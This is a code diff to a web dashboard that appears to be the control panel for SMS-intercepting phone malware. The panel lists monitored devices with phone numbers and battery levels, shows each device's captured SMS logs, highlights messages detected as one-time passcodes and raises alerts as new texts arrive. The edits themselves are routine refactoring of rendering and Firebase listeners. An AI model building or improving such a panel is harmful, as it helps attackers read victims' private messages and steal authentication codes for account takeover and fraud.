@@ -430,23 +430,6 @@
             animation: slideIn 0.3s ease;
         }
 
-        .inbox-message.new-message {
-            border-left-color: #4fc3f7;
-            background: rgba(79, 195, 247, 0.08);
-            animation: highlightIn 0.5s ease;
-        }
-
-        @keyframes highlightIn {
-            0% {
-                background: rgba(79, 195, 247, 0.25);
-                transform: scale(1.02);
-            }
-            100% {
-                background: rgba(79, 195, 247, 0.08);
-                transform: scale(1);
-            }
-        }
-
         .inbox-message .msg-header {
             display: flex;
             justify-content: space-between;
@@ -662,7 +645,7 @@
     let currentFilter = 'all';
     let searchQuery = '';
     let isInitialLoad = true;
-    let activeListeners = {};
+    let deviceListeners = {};
 
     // ===== TOAST =====
     function showToast(msg) {
@@ -790,6 +773,7 @@
 
             const card = document.createElement('div');
             card.className = `device-card ${!online ? 'offline' : ''} ${isSelected ? 'selected' : ''}`;
+            card.dataset.deviceId = id;
             card.onclick = () => selectDevice(id);
 
             const displayPhone = phone || 'No number';
@@ -827,6 +811,7 @@
             grid.appendChild(card);
         });
 
+        // Auto-select first if none selected
         if (!selectedDeviceId && userIds.length > 0) {
             selectDevice(userIds[0]);
         }
@@ -836,12 +821,12 @@
         if (selectedDeviceId === deviceId) return;
         selectedDeviceId = deviceId;
         renderDevices();
+        // Force refresh inbox with latest data
         renderInbox();
-        // Clear notification dot when viewing a device
         document.getElementById('newMsgDot').classList.remove('show');
     }
 
-    // ===== RENDER INBOX WITH INSTANT UPDATE =====
+    // ===== RENDER INBOX =====
     function renderInbox(newMessageId = null) {
         const container = document.getElementById('inboxMessages');
         const info = document.getElementById('selectedDeviceInfo');
@@ -854,6 +839,7 @@
             return;
         }
 
+        // Get the LATEST data directly from allUsers
         const user = allUsers[selectedDeviceId];
         const phone = getPhoneNumber(user) || 'No number';
         const battery = getBattery(user);
@@ -868,12 +854,11 @@
             return;
         }
 
-        // If new message ID is provided, add it to the top with highlight
+        // If new message ID is provided and it's for the selected device
         if (newMessageId) {
-            // Find the new message
             const newSms = smsList.find(s => s.id === newMessageId);
             if (newSms) {
-                // Add to top of list
+                // Prepend the new message
                 const div = document.createElement('div');
                 div.className = 'inbox-message new-message';
                 const sender = newSms.sender || 'Unknown';
@@ -895,25 +880,21 @@
                     <div class="msg-body ${isOTP ? 'highlight' : ''}">${bodyHtml}</div>
                 `;
                 
-                // Prepend to container
+                // Prepend and scroll to top
                 container.prepend(div);
+                container.scrollTop = 0;
                 
-                // Show notification dot on the header
+                // Show notification dot
                 document.getElementById('newMsgDot').classList.add('show');
                 
-                // Update the device card SMS count
+                // Update device card count
                 updateDeviceCardSmsCount(selectedDeviceId);
-                
-                // Update total SMS count
                 updateStats();
-                
-                // Scroll to top
-                container.scrollTop = 0;
                 return;
             }
         }
 
-        // Full render (initial load or manual refresh)
+        // Full render (initial load or when selecting a device)
         container.innerHTML = '';
 
         // Show notifications first
@@ -959,17 +940,12 @@
     }
 
     function updateDeviceCardSmsCount(deviceId) {
-        // Find and update the device card's SMS count
         const cards = document.querySelectorAll('.device-card');
         cards.forEach(card => {
-            const idText = card.querySelector('.device-id')?.textContent || '';
-            if (idText.includes(deviceId.substring(0, 14))) {
+            if (card.dataset.deviceId === deviceId) {
                 const countSpan = card.querySelector('.sms-count');
-                if (countSpan) {
-                    const user = allUsers[deviceId];
-                    if (user) {
-                        countSpan.textContent = getSmsCount(user);
-                    }
+                if (countSpan && allUsers[deviceId]) {
+                    countSpan.textContent = getSmsCount(allUsers[deviceId]);
                 }
             }
         });
@@ -1015,13 +991,16 @@
     function setupFirebaseListeners() {
         const usersRef = database.ref('users');
 
-        // Listen for all user data changes (initial load)
+        // Listen for all user data changes
         usersRef.on('value', (snapshot) => {
             const data = snapshot.val();
             if (data) {
                 allUsers = data;
                 renderDevices();
-                renderInbox();
+                // Only update inbox if we have a selected device
+                if (selectedDeviceId && allUsers[selectedDeviceId]) {
+                    renderInbox();
+                }
                 updateStats();
                 
                 if (isInitialLoad) {
@@ -1034,7 +1013,7 @@
             }
         });
 
-        // Listen for new/changed users and their SMS
+        // Listen for specific user changes
         usersRef.on('child_added', (snapshot) => {
             const key = snapshot.key;
             const data = snapshot.val();
@@ -1042,7 +1021,6 @@
                 allUsers[key] = data;
                 renderDevices();
                 updateStats();
-                // If this is the selected device, update inbox
                 if (key === selectedDeviceId) {
                     renderInbox();
                 }
@@ -1058,30 +1036,27 @@
                 renderDevices();
                 updateStats();
                 
-                // Check if SMS was added
+                // Check if this is the selected device
                 if (key === selectedDeviceId) {
                     const oldSmsCount = oldData?.sms_logs ? Object.keys(oldData.sms_logs).length : 0;
                     const newSmsCount = data.sms_logs ? Object.keys(data.sms_logs).length : 0;
                     
                     if (newSmsCount > oldSmsCount) {
-                        // Find the new message ID
+                        // Find new message
                         const oldIds = oldData?.sms_logs ? Object.keys(oldData.sms_logs) : [];
                         const newIds = data.sms_logs ? Object.keys(data.sms_logs) : [];
                         const newMsgId = newIds.find(id => !oldIds.includes(id));
                         
                         if (newMsgId) {
-                            // Show toast notification
                             const newSms = data.sms_logs[newMsgId];
                             if (newSms) {
                                 showToast(`📨 New SMS from ${newSms.sender || 'Unknown'}`);
                             }
-                            // Update inbox with new message
                             renderInbox(newMsgId);
                         } else {
                             renderInbox();
                         }
                     } else {
-                        // Just re-render
                         renderInbox();
                     }
                 }
